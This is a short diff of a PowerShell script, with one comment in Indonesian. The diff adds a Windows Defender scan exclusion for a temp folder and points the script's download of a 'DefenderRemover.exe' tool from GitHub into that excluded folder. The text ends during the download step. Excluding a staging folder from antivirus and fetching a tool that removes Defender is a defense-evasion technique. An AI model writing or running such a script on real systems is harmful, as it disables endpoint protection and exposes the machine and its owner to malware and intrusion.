@@ -1,9 +1,15 @@
 # Enable TLSv1.2 for compatibility with older clients
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
 
+$folderPath = "$env:TEMP\hinzdc"
+Add-MpPreference -ExclusionPath $folderPath
+
+# Verifikasi pengecualian yang telah ditambahkan
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
 $DownloadURL = 'https://github.com/ionuttbara/windows-defender-remover/releases/download/release_def_12_5_6_2/DefenderRemover.exe'
 
-$FilePath = "$env:TEMP\def.exe"
+$FilePath = "$env:TEMP\hinzdc\def.exe"
 
 try {
     Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath
